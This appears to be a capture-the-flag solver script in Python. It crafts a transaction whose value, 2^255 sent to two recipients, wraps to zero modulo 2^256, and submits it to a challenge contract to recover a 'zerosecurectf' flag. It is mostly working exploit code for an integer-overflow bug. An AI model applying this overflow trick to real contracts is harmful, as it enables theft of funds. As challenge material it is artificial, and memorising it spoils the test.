#!/usr/bin/env python3
from pathlib import Path
import json, math, hashlib, struct, re, sys
HERE = Path(__file__).resolve().parent
CHALLENGE = HERE.parent / "challenge"
def artifact(name):
    p = CHALLENGE / name
    return p if p.exists() else HERE / "unlocked" / name
def load(name):
    return json.loads(artifact(name).read_text())
def flag_bytes(n):
    return n.to_bytes(max(1,(n.bit_length()+7)//8), "big")
def emit(value):
    if isinstance(value,bytes): value=value.decode()
    if not re.fullmatch(r"zerosecurectf\{[^}]+\}",value):
        raise RuntimeError("recovered value is not a flag: " + repr(value))
    print(value)


import subprocess
h=load("state.json");value=1<<255
proof={"sender":"atkA","recipients":["atkA","atkB"],"value":value}
assert value*len(proof["recipients"])%(1<<256)==0
(HERE/"exploit_tx.json").write_text(json.dumps(proof,indent=2)+"\n")
reply=subprocess.check_output([sys.executable,str(artifact("contract.py")),str(HERE/"exploit_tx.json"),str(HERE/"accepted_flags.txt")],text=True)
print(reply.strip())
